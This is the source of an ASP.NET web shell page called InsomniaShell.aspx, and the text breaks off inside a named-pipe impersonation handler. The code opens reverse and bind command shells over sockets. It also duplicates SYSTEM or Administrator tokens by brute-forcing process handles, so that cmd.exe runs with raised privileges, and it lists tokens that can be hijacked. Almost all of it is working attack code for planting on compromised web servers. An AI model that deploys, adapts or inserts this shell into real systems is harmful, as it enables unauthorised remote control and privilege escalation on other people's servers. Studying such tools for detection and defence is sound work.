<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.Data.SqlClient" %>

<script runat="server">
//--------------------------------------------------------
//    INSOMNIA SECURITY :: InsomniaShell.aspx
//
//          .aspx shell helper page
// brett.moore@insomniasec.com ::  www.insomniasec.com
//--------------------------------------------------------
// Some c token code portions borrowed from ppl such as
// Cesar Cerrudo and Matt Conover 
//--------------------------------------------------------
// Some Bollox To Do Socket Shells With .net
// throw in some more to do token impersonation
// and a bit more for namedpipe impersonation
//--------------------------------------------------------

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public int cb;
        public String lpReserved;
        public String lpDesktop;
        public String lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int Length;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }
    
    
    [DllImport("kernel32.dll")]
    static extern bool CreateProcess(string lpApplicationName,
       string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles,
       uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
       [In] ref STARTUPINFO lpStartupInfo,
       out PROCESS_INFORMATION lpProcessInformation);

    public static uint INFINITE = 0xFFFFFFFF;
    
    [DllImport("kernel32", SetLastError = true, ExactSpelling = true)]
    internal static extern Int32 WaitForSingleObject(IntPtr handle, Int32 milliseconds);

    internal struct sockaddr_in
    {
        /// <summary>
        /// Protocol family indicator.
        /// </summary>
        public short sin_family;
        /// <summary>
        /// Protocol port.
        /// </summary>
        public short sin_port;
        /// <summary>
        /// Actual address value.
        /// </summary>
        public int sin_addr;
        /// <summary>
        /// Address content list.
        /// </summary>
        //[MarshalAs(UnmanagedType.LPStr, SizeConst=8)]
        //public string sin_zero;
        public long sin_zero;
    }

    [DllImport("kernel32.dll")]
    static extern IntPtr GetStdHandle(int nStdHandle);

    [DllImport("kernel32.dll")]
    static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);

    public const int STD_INPUT_HANDLE = -10;
    public const int STD_OUTPUT_HANDLE = -11;
    public const int STD_ERROR_HANDLE = -12;
    
    [DllImport("kernel32")]
    static extern bool AllocConsole();


    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    internal static extern IntPtr WSASocket([In] AddressFamily addressFamily,
                                            [In] SocketType socketType,
                                            [In] ProtocolType protocolType,
                                            [In] IntPtr protocolInfo, 
                                            [In] uint group,
                                            [In] int flags
                                            );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    internal static extern int inet_addr([In] string cp);
    [DllImport("ws2_32.dll")]
    private static extern string inet_ntoa(uint ip);

    [DllImport("ws2_32.dll")]
    private static extern uint htonl(uint ip);
    
    [DllImport("ws2_32.dll")]
    private static extern uint ntohl(uint ip);
    
    [DllImport("ws2_32.dll")]
    private static extern ushort htons(ushort ip);
    
    [DllImport("ws2_32.dll")]
    private static extern ushort ntohs(ushort ip);   

    
   [DllImport("WS2_32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
   internal static extern int connect([In] IntPtr socketHandle,[In] ref sockaddr_in socketAddress,[In] int socketAddressSize);

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int send(
                                [In] IntPtr socketHandle,
                                [In] byte[] pinnedBuffer,
                                [In] int len,
                                [In] SocketFlags socketFlags
                                );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int recv(
                                [In] IntPtr socketHandle,
                                [In] IntPtr pinnedBuffer,
                                [In] int len,
                                [In] SocketFlags socketFlags
                                );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int closesocket(
                                       [In] IntPtr socketHandle
                                       );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern IntPtr accept(
                                  [In] IntPtr socketHandle,
                                  [In, Out] ref sockaddr_in socketAddress,
                                  [In, Out] ref int socketAddressSize
                                  );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int listen(
                                  [In] IntPtr socketHandle,
                                  [In] int backlog
                                  );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int bind(
                                [In] IntPtr socketHandle,
                                [In] ref sockaddr_in  socketAddress,
                                [In] int socketAddressSize
                                );


   public enum TOKEN_INFORMATION_CLASS
   {
       TokenUser = 1,
       TokenGroups,
       TokenPrivileges,
       TokenOwner,
       TokenPrimaryGroup,
       TokenDefaultDacl,
       TokenSource,
       TokenType,
       TokenImpersonationLevel,
       TokenStatistics,
       TokenRestrictedSids,
       TokenSessionId
   }

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public static extern bool GetTokenInformation(
       IntPtr hToken,
       TOKEN_INFORMATION_CLASS tokenInfoClass,
       IntPtr TokenInformation,
       int tokeInfoLength,
       ref int reqLength);

   public enum TOKEN_TYPE
   {
       TokenPrimary = 1,
       TokenImpersonation
   }

   public enum SECURITY_IMPERSONATION_LEVEL
   {
       SecurityAnonymous,
       SecurityIdentification,
       SecurityImpersonation,
       SecurityDelegation
   }

   
   [DllImport("advapi32.dll", EntryPoint = "CreateProcessAsUser", SetLastError = true, CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
   public extern static bool CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandle, int dwCreationFlags, IntPtr lpEnvironment,
       String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

   [DllImport("advapi32.dll", EntryPoint = "DuplicateTokenEx")]
   public extern static bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLeve, TOKEN_TYPE TokenType,
       ref IntPtr DuplicateTokenHandle);

   

   const int ERROR_NO_MORE_ITEMS = 259;

   [StructLayout(LayoutKind.Sequential)]
   struct TOKEN_USER
   {
       public _SID_AND_ATTRIBUTES User;
   }

   [StructLayout(LayoutKind.Sequential)]
   public struct _SID_AND_ATTRIBUTES
   {
       public IntPtr Sid;
       public int Attributes;
   }

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public extern static bool LookupAccountSid
   (
       [In, MarshalAs(UnmanagedType.LPTStr)] string lpSystemName, // name of local or remote computer
       IntPtr pSid, // security identifier
       StringBuilder Account, // account name buffer
       ref int cbName, // size of account name buffer
       StringBuilder DomainName, // domain name
       ref int cbDomainName, // size of domain name buffer
       ref int peUse // SID type
       // ref _SID_NAME_USE peUse // SID type
   );

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public extern static bool ConvertSidToStringSid(
       IntPtr pSID,
       [In, Out, MarshalAs(UnmanagedType.LPTStr)] ref string pStringSid);


   [DllImport("kernel32.dll", SetLastError = true)]
   public static extern bool CloseHandle(
       IntPtr hHandle);

   [DllImport("kernel32.dll", SetLastError = true)]
   public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);
   [Flags]
   public enum ProcessAccessFlags : uint
   {
       All = 0x001F0FFF,
       Terminate = 0x00000001,
       CreateThread = 0x00000002,
       VMOperation = 0x00000008,
       VMRead = 0x00000010,
       VMWrite = 0x00000020,
       DupHandle = 0x00000040,
       SetInformation = 0x00000200,
       QueryInformation = 0x00000400,
       Synchronize = 0x00100000
   }

   [DllImport("kernel32.dll")]
   static extern IntPtr GetCurrentProcess();

   [DllImport("kernel32.dll")]
   extern static IntPtr GetCurrentThread();


   [DllImport("kernel32.dll", SetLastError = true)]
   [return: MarshalAs(UnmanagedType.Bool)]
   static extern bool DuplicateHandle(IntPtr hSourceProcessHandle,
      IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle,
      uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

    [DllImport("psapi.dll", SetLastError = true)]
    public static extern bool EnumProcessModules(IntPtr hProcess,
    [MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.U4)] [In][Out] uint[] lphModule,
    uint cb,
    [MarshalAs(UnmanagedType.U4)] out uint lpcbNeeded);

    [DllImport("psapi.dll")]
    static extern uint GetModuleBaseName(IntPtr hProcess, uint hModule, StringBuilder lpBaseName, uint nSize);


    //-------------------------------------------------------------------------------------------------------------------------------

    public const uint PIPE_ACCESS_OUTBOUND = 0x00000002;
    public const uint PIPE_ACCESS_DUPLEX = 0x00000003;
    public const uint PIPE_ACCESS_INBOUND = 0x00000001;
    public const uint PIPE_WAIT = 0x00000000;
    public const uint PIPE_NOWAIT = 0x00000001;
    public const uint PIPE_READMODE_BYTE = 0x00000000;
    public const uint PIPE_READMODE_MESSAGE = 0x00000002;
    public const uint PIPE_TYPE_BYTE = 0x00000000;
    public const uint PIPE_TYPE_MESSAGE = 0x00000004;
    public const uint PIPE_CLIENT_END = 0x00000000;
    public const uint PIPE_SERVER_END = 0x00000001;
    public const uint PIPE_UNLIMITED_INSTANCES = 255;

    public const uint NMPWAIT_WAIT_FOREVER = 0xffffffff;
    public const uint NMPWAIT_NOWAIT = 0x00000001;
    public const uint NMPWAIT_USE_DEFAULT_WAIT = 0x00000000;

    public const uint GENERIC_READ = (0x80000000);
    public const uint GENERIC_WRITE = (0x40000000);
    public const uint GENERIC_EXECUTE = (0x20000000);
    public const uint GENERIC_ALL = (0x10000000);

    public const uint CREATE_NEW = 1;
    public const uint CREATE_ALWAYS = 2;
    public const uint OPEN_EXISTING = 3;
    public const uint OPEN_ALWAYS = 4;
    public const uint TRUNCATE_EXISTING = 5;

    public const int INVALID_HANDLE_VALUE = -1;

    public const ulong ERROR_SUCCESS = 0;
    public const ulong ERROR_CANNOT_CONNECT_TO_PIPE = 2;
    public const ulong ERROR_PIPE_BUSY = 231;
    public const ulong ERROR_NO_DATA = 232;
    public const ulong ERROR_PIPE_NOT_CONNECTED = 233;
    public const ulong ERROR_MORE_DATA = 234;
    public const ulong ERROR_PIPE_CONNECTED = 535;
    public const ulong ERROR_PIPE_LISTENING = 536;

    //-------------------------------------------------------------------------------------------------------------------------------
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateNamedPipe(
        String lpName,									// pipe name
        uint dwOpenMode,								// pipe open mode
        uint dwPipeMode,								// pipe-specific modes
        uint nMaxInstances,							// maximum number of instances
        uint nOutBufferSize,						// output buffer size
        uint nInBufferSize,							// input buffer size
        uint nDefaultTimeOut,						// time-out interval
        IntPtr pipeSecurityDescriptor		// SD
        );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ConnectNamedPipe(
        IntPtr hHandle,									// handle to named pipe
        uint lpOverlapped					// overlapped structure
        );

    [DllImport("Advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateNamedPipeClient(
        IntPtr hHandle);									// handle to named pipe

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetNamedPipeHandleState(
        IntPtr hHandle,
        IntPtr lpState,
        IntPtr lpCurInstances,
        IntPtr lpMaxCollectionCount,
        IntPtr lpCollectDataTimeout,
        StringBuilder lpUserName,
        int nMaxUserNameSize
        );
    //------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------    
    
    
    
    protected void CallbackShell(string server, int port)
    {
        // This will do a call back shell to the specified server and port
        string request = "Shell enroute.......\n";
        Byte[] bytesSent = Encoding.ASCII.GetBytes(request);

        IntPtr oursocket = IntPtr.Zero;
        
        sockaddr_in socketinfo;
    
        // Create a socket connection with the specified server and port.
        oursocket = WSASocket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.IP, IntPtr.Zero, 0, 0);

        // Setup And Bind Socket
        socketinfo = new sockaddr_in();
        
        socketinfo.sin_family = (short) AddressFamily.InterNetwork;
        socketinfo.sin_addr = inet_addr(server);
        socketinfo.sin_port = (short) htons((ushort)port);
        
        //Connect
        connect(oursocket, ref socketinfo, Marshal.SizeOf(socketinfo));

        send(oursocket, bytesSent, request.Length, 0);

        SpawnProcessAsPriv(oursocket);

        closesocket(oursocket);
        
      
    }

    protected void BindPortShell(int port)
    {
        // This will bind to a port and then send back a shell
        string request = "Shell enroute.......\n";
        Byte[] bytesSent = Encoding.ASCII.GetBytes(request);

        IntPtr oursocket = IntPtr.Zero;

        sockaddr_in socketinfo;

        // Create a socket connection with the specified server and port.
        oursocket = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, IntPtr.Zero, 0, 0);

        // Setup And Bind Socket
        socketinfo = new sockaddr_in();
        socketinfo.sin_family = (short)AddressFamily.InterNetwork;
        uint INADDR_ANY	=0x00000000;

        socketinfo.sin_addr = (int) htonl(INADDR_ANY);
        socketinfo.sin_port = (short)htons((ushort) port);

        // Bind
        bind(oursocket,ref socketinfo,Marshal.SizeOf(socketinfo));

        // Lsten
 	    	listen(oursocket, 128);
	  
        // Wait for connection
        int socketSize = Marshal.SizeOf(socketinfo);

        oursocket = accept(oursocket, ref socketinfo, ref socketSize);
	    
        send(oursocket, bytesSent, request.Length, 0);

        SpawnProcessAsPriv(oursocket);

        closesocket(oursocket);
       
    }

    protected void SpawnProcess(IntPtr oursocket)
    {
        // Spawn a process to a socket withouth impersonation
        bool retValue;
        string Application = Environment.GetEnvironmentVariable("comspec"); 

        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
        STARTUPINFO sInfo = new STARTUPINFO();
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        pSec.Length = Marshal.SizeOf(pSec);

        sInfo.dwFlags = 0x00000101; // STARTF.STARTF_USESHOWWINDOW | STARTF.STARTF_USESTDHANDLES;

        // Set Handles
        sInfo.hStdInput = oursocket;
        sInfo.hStdOutput = oursocket;
        sInfo.hStdError = oursocket;


        //Spawn Shell
        retValue = CreateProcess(Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);

        // Wait for it to finish
        WaitForSingleObject(pInfo.hProcess, (int)INFINITE);
    }

    
    protected void GetSystemToken(ref IntPtr DupeToken)
    {        
    		// Enumerate all accessible processes looking for a system token

        SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
        sa.bInheritHandle = false;
        sa.Length = Marshal.SizeOf(sa);
        sa.lpSecurityDescriptor = (IntPtr)0;

        // Find Token
        IntPtr pTokenType = Marshal.AllocHGlobal(4);
        int TokenType = 0;
        int cb = 4;

        string astring = "";
        IntPtr token = IntPtr.Zero;
        IntPtr duptoken = IntPtr.Zero;

        IntPtr hProc = IntPtr.Zero;
        IntPtr usProcess = IntPtr.Zero;


        uint pid = 0;

        for (pid = 0; pid < 9999; pid += 4)
        {
            hProc = OpenProcess(ProcessAccessFlags.DupHandle, false, pid);
            usProcess = GetCurrentProcess();

            if (hProc != IntPtr.Zero)
            {
                for (int x = 1; x <= 9999; x += 4)
                {
                    token = (IntPtr)x;

                    if (DuplicateHandle(hProc, token, usProcess, out duptoken, 0, false, 2))
                    {
                        if (GetTokenInformation(duptoken, TOKEN_INFORMATION_CLASS.TokenType, pTokenType, 4, ref cb))
                        {
                            TokenType = Marshal.ReadInt32(pTokenType);

                            switch ((TOKEN_TYPE)TokenType)
                            {
                                case TOKEN_TYPE.TokenPrimary:
                                    astring = "Primary";
                                    break;
                                case TOKEN_TYPE.TokenImpersonation:
                                    // Get the impersonation level
                                    GetTokenInformation(duptoken, TOKEN_INFORMATION_CLASS.TokenImpersonationLevel, pTokenType, 4, ref cb);
                                    TokenType = Marshal.ReadInt32(pTokenType);
                                    switch ((SECURITY_IMPERSONATION_LEVEL)TokenType)
                                    {
                                        case SECURITY_IMPERSONATION_LEVEL.SecurityAnonymous:
                                            astring = "Impersonation - Anonymous";
                                            break;
                                        case SECURITY_IMPERSONATION_LEVEL.SecurityIdentification:
                                            astring = "Impersonation - Identification";
                                            break;
                                        case SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation:
                                            astring = "Impersonation - Impersonation";
                                            break;
                                        case SECURITY_IMPERSONATION_LEVEL.SecurityDelegation:
                                            astring = "Impersonation - Delegation";
                                            break;
                                    }

                                    break;
                            }


                            // Get user name
                            TOKEN_USER tokUser;
                            string username;
                            const int bufLength = 256;
                            IntPtr tu = Marshal.AllocHGlobal(bufLength);
                            cb = bufLength;
                            GetTokenInformation(duptoken, TOKEN_INFORMATION_CLASS.TokenUser, tu, cb, ref cb);
                            tokUser = (TOKEN_USER)Marshal.PtrToStructure(tu, typeof(TOKEN_USER));

                            username = DumpAccountSid(tokUser.User.Sid);

                            Marshal.FreeHGlobal(tu);

                            if (username.ToString() == "NT AUTHORITY\\\\SYSTEM")
                            {
                                // Coverts a primary token to an impersonation
                                if (DuplicateTokenEx(duptoken, GENERIC_ALL, ref sa, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, ref DupeToken))
                                {
                                    // Display the token type
                                    //Response.Output.Write("* Duplicated token is {0}<br>", DisplayTokenType(DupeToken));

                                    return;
                                }
                            }   
                        }
                        CloseHandle(duptoken);
                    }
                }
                CloseHandle(hProc);
            }
            
        }
        
    }
    
    protected void GetAdminToken(ref IntPtr DupeToken)
    {        
    		// Enumerate all accessible processes looking for a system token

        SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
        sa.bInheritHandle = false;
        sa.Length = Marshal.SizeOf(sa);
        sa.lpSecurityDescriptor = (IntPtr)0;

        // Find Token
        IntPtr pTokenType = Marshal.AllocHGlobal(4);
        int TokenType = 0;
        int cb = 4;

        string astring = "";
        IntPtr token = IntPtr.Zero;
        IntPtr duptoken = IntPtr.Zero;

        IntPtr hProc = IntPtr.Zero;
        IntPtr usProcess = IntPtr.Zero;


        uint pid = 0;

        for (pid = 0; pid < 9999; pid += 4)
        {
            hProc = OpenProcess(ProcessAccessFlags.DupHandle, false, pid);
            usProcess = GetCurrentProcess();

            if (hProc != IntPtr.Zero)
            {
                for (int x = 1; x <= 9999; x += 4)
                {
                    token = (IntPtr)x;

                    if (DuplicateHandle(hProc, token, usProcess, out duptoken, 0, false, 2))
                    {
                        if (GetTokenInformation(duptoken, TOKEN_INFORMATION_CLASS.TokenType, pTokenType, 4, ref cb))
                        {
                            TokenType = Marshal.ReadInt32(pTokenType);

                            switch ((TOKEN_TYPE)TokenType)
                            {
                                case TOKEN_TYPE.TokenPrimary:
                                    astring = "Primary";
                                    break;
                                case TOKEN_TYPE.TokenImpersonation:
                                    // Get the impersonation level
                                    GetTokenInformation(duptoken, TOKEN_INFORMATION_CLASS.TokenImpersonationLevel, pTokenType, 4, ref cb);
                                    TokenType = Marshal.ReadInt32(pTokenType);
                                    switch ((SECURITY_IMPERSONATION_LEVEL)TokenType)
                                    {
                                        case SECURITY_IMPERSONATION_LEVEL.SecurityAnonymous:
                                            astring = "Impersonation - Anonymous";
                                            break;
                                        case SECURITY_IMPERSONATION_LEVEL.SecurityIdentification:
                                            astring = "Impersonation - Identification";
                                            break;
                                        case SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation:
                                            astring = "Impersonation - Impersonation";
                                            break;
                                        case SECURITY_IMPERSONATION_LEVEL.SecurityDelegation:
                                            astring = "Impersonation - Delegation";
                                            break;
                                    }

                                    break;
                            }


                            // Get user name
                            TOKEN_USER tokUser;
                            string username;
                            const int bufLength = 256;
                            IntPtr tu = Marshal.AllocHGlobal(bufLength);
                            cb = bufLength;
                            GetTokenInformation(duptoken, TOKEN_INFORMATION_CLASS.TokenUser, tu, cb, ref cb);
                            tokUser = (TOKEN_USER)Marshal.PtrToStructure(tu, typeof(TOKEN_USER));

                            username = DumpAccountSid(tokUser.User.Sid);

                            Marshal.FreeHGlobal(tu);
  
                            if (username.EndsWith("Administrator"))
                            {
                                // Coverts a primary token to an impersonation
                                if (DuplicateTokenEx(duptoken, GENERIC_ALL, ref sa, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, ref DupeToken))
                                {
                                    // Display the token type
                                    //Response.Output.Write("* Duplicated token is {0}<br>", DisplayTokenType(DupeToken));

                                    return;
                                }
                            }   
                        }
                        CloseHandle(duptoken);
                    }
                }
                CloseHandle(hProc);
            }
            
        }
        
    }
    
    protected void SpawnProcessAsPriv(IntPtr oursocket)
    {
        // Spawn a process to a socket
        
        bool retValue;
        string Application = Environment.GetEnvironmentVariable("comspec"); 

        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
        STARTUPINFO sInfo = new STARTUPINFO();
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        pSec.Length = Marshal.SizeOf(pSec);

        sInfo.dwFlags = 0x00000101; // STARTF.STARTF_USESHOWWINDOW | STARTF.STARTF_USESTDHANDLES;

        IntPtr DupeToken = new IntPtr(0);

        
        // Get the token
        GetSystemToken(ref DupeToken);
        
        if (DupeToken == IntPtr.Zero)
						GetAdminToken(ref DupeToken);
        

        // Display the token type
        //Response.Output.Write("* Creating shell as {0}<br>", DisplayTokenType(DupeToken));
       
             
        
        // Set Handles
        sInfo.hStdInput = oursocket;
        sInfo.hStdOutput = oursocket;
        sInfo.hStdError = oursocket;


        //Spawn Shell
        if (DupeToken == IntPtr.Zero)
       
            retValue = CreateProcess(Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
        else
            retValue = CreateProcessAsUser(DupeToken, Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);

        // Wait for it to finish
        WaitForSingleObject(pInfo.hProcess, (int)INFINITE);

        //Close It all up
        CloseHandle(DupeToken);
    }

    //--------------------------------------------------------
    // Display the type of token and the impersonation level
    //--------------------------------------------------------
    protected StringBuilder DisplayTokenType(IntPtr token)
    {
        IntPtr pTokenType = Marshal.AllocHGlobal(4);
        int TokenType = 0;
        int cb = 4;

        StringBuilder sb = new StringBuilder();

        GetTokenInformation(token, TOKEN_INFORMATION_CLASS.TokenType, pTokenType, 4, ref cb);
        TokenType = Marshal.ReadInt32(pTokenType);

        switch ((TOKEN_TYPE)TokenType)
        {
            case TOKEN_TYPE.TokenPrimary:
                sb.Append("Primary");
                break;
            case TOKEN_TYPE.TokenImpersonation:
                // Get the impersonation level
                GetTokenInformation(token, TOKEN_INFORMATION_CLASS.TokenImpersonationLevel, pTokenType, 4, ref cb);
                TokenType = Marshal.ReadInt32(pTokenType);
                switch ((SECURITY_IMPERSONATION_LEVEL)TokenType)
                {
                    case SECURITY_IMPERSONATION_LEVEL.SecurityAnonymous:
                        sb.Append("Impersonation - Anonymous");
                        break;
                    case SECURITY_IMPERSONATION_LEVEL.SecurityIdentification:
                        sb.Append("Impersonation - Identification");
                        break;
                    case SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation:
                        sb.Append("Impersonation - Impersonation");
                        break;
                    case SECURITY_IMPERSONATION_LEVEL.SecurityDelegation:
                        sb.Append("Impersonation - Delegation");
                        break;
                }

                break;
        }
        Marshal.FreeHGlobal(pTokenType);
        return sb;
    }

    protected void DisplayCurrentContext()
    {
        Response.Output.Write("* Thread executing as {0}, token is {1}<br>", WindowsIdentity.GetCurrent().Name, DisplayTokenType(WindowsIdentity.GetCurrent().Token));
    }

    protected string DumpAccountSid(IntPtr SID)
    {
        int cchAccount = 0;
        int cchDomain = 0;
        int snu = 0;
        StringBuilder sb = new StringBuilder();

        // Caller allocated buffer
        StringBuilder Account = null;
        StringBuilder Domain = null;
        bool ret = LookupAccountSid(null, SID, Account, ref cchAccount, Domain, ref cchDomain, ref snu);
        if (ret == true)
            if (Marshal.GetLastWin32Error() == ERROR_NO_MORE_ITEMS)
                return "Error";
        try
        {
            Account = new StringBuilder(cchAccount);
            Domain = new StringBuilder(cchDomain);
            ret = LookupAccountSid(null, SID, Account, ref cchAccount, Domain, ref cchDomain, ref snu);
            if (ret)
            {
                sb.Append(Domain);
                sb.Append(@"\\");
                sb.Append(Account);
            }
            else
                sb.Append("logon account (no name) ");
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex.Message);
        }
        finally
        {
        }

        //string SidString = null;
        
        //ConvertSidToStringSid(SID, ref SidString);
        //sb.Append("\nSID: ");
        //sb.Append(SidString);
        return sb.ToString();
    }
    
    protected string GetProcessName(uint PID)
    {
        IntPtr hProc = IntPtr.Zero;
        uint[] hMod = new uint[2048];
        uint cbNeeded;
        int exeNameSize = 255;
        StringBuilder exeName = null;
        
        exeName = new StringBuilder(exeNameSize);
        
        
        hProc = OpenProcess(ProcessAccessFlags.QueryInformation | ProcessAccessFlags.VMRead, false, PID);
        
        if (hProc != IntPtr.Zero)
        {
            if (EnumProcessModules(hProc, hMod, UInt32.Parse(hMod.Length.ToString()), out cbNeeded))
            {

                GetModuleBaseName(hProc, hMod[0],  exeName, (uint)exeNameSize);
            }
            
        }
        
        CloseHandle( hProc );

        return exeName.ToString();
    }
    
    
    //***************************************************************************
    // DISPLAY THE AVAILABLE TOKENS
    //***************************************************************************
    
    protected void DisplayAvailableTokens()
    {

        IntPtr pTokenType = Marshal.AllocHGlobal(4);
        int TokenType = 0;
        int cb = 4;

        string astring = "";
        IntPtr token = IntPtr.Zero;
        IntPtr duptoken = IntPtr.Zero;

        IntPtr hProc = IntPtr.Zero;
        IntPtr usProcess = IntPtr.Zero;
        

        uint pid = 0;

        for (pid = 0; pid < 9999; pid+=4)
        {
            hProc = OpenProcess(ProcessAccessFlags.DupHandle, false, pid);
            usProcess = GetCurrentProcess();

            if (hProc != IntPtr.Zero)
            {
                //Response.Output.Write("Opened process PID: {0} : {1}<br>", pid, GetProcessName(pid));

                for (int x = 1; x <= 9999; x+=4)
                {
                    token = (IntPtr)x;

                    if (DuplicateHandle(hProc, token, usProcess, out duptoken, 0, false, 2))
                    {
                        //Response.Output.Write("Duplicated handle: {0}<br>", x);
                        if (GetTokenInformation(duptoken, TOKEN_INFORMATION_CLASS.TokenType, pTokenType, 4, ref cb))
                        {
                            TokenType = Marshal.ReadInt32(pTokenType);

                            switch ((TOKEN_TYPE)TokenType)
                            {
                                case TOKEN_TYPE.TokenPrimary:
                                    astring = "Primary";
                                    break;
                                case TOKEN_TYPE.TokenImpersonation:
                                    // Get the impersonation level
                                    GetTokenInformation(duptoken, TOKEN_INFORMATION_CLASS.TokenImpersonationLevel, pTokenType, 4, ref cb);
                                    TokenType = Marshal.ReadInt32(pTokenType);
                                    switch ((SECURITY_IMPERSONATION_LEVEL)TokenType)
                                    {
                                        case SECURITY_IMPERSONATION_LEVEL.SecurityAnonymous:
                                            astring = "Impersonation - Anonymous";
                                            break;
                                        case SECURITY_IMPERSONATION_LEVEL.SecurityIdentification:
                                            astring = "Impersonation - Identification";
                                            break;
                                        case SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation:
                                            astring = "Impersonation - Impersonation";
                                            break;
                                        case SECURITY_IMPERSONATION_LEVEL.SecurityDelegation:
                                            astring = "Impersonation - Delegation";
                                            break;
                                    }

                                    break;
                            }


                            // Get user name
                            TOKEN_USER tokUser;
                            string username;
                            const int bufLength = 256;
                            IntPtr tu = Marshal.AllocHGlobal(bufLength);
                            cb = bufLength;
                            GetTokenInformation(duptoken, TOKEN_INFORMATION_CLASS.TokenUser, tu, cb, ref cb);
                            tokUser = (TOKEN_USER)Marshal.PtrToStructure(tu, typeof(TOKEN_USER));

                            username = DumpAccountSid(tokUser.User.Sid);

                            Marshal.FreeHGlobal(tu);

                            if (username.ToString()  ==  "NT AUTHORITY\\\\SYSTEM")
                                Response.Output.Write("[{0:0000}] - {2} : {3}</a><br>", pid,x, username, astring);
                            else if (username.EndsWith("Administrator"))
                                Response.Output.Write("[{0:0000}] - {2} : {3}</a><br>", pid,x, username, astring);
                            //else
                                //Response.Output.Write("[{0:0000}] - {2} : {3}</a><br>", pid, x, username, astring);
                        }
                        CloseHandle(duptoken);
                    }
                    else
                    {
                        //Response.Output.Write("Handle: {0} Error: {1}<br>", x,GetLastError());
                    }
                }
                CloseHandle(hProc);
            }
            else
            {
                //Response.Output.Write("Failed to open process PID: {0}<br>", pid);

            }
        }
    }


    protected void Page_Load(object sender, EventArgs e)
    {
    }


    protected void butConnectBack_Click(object sender, EventArgs e)
    {
        String host = txtRemoteHost.Text;
        int port = Convert.ToInt32(txtRemotePort.Text);
                
        CallbackShell(host, port);
    }

    protected void butBindPort_Click(object sender, EventArgs e)
    {

        int port = Convert.ToInt32(txtBindPort.Text);

        BindPortShell(port);
    }

    protected void butCreateNamedPipe_Click(object sender, EventArgs e)
    {
        String pipeName = "\\\\.\\pipe\\" + txtPipeName.Text;

        IntPtr hPipe = IntPtr.Zero;
        IntPtr secAttr = IntPtr.Zero;

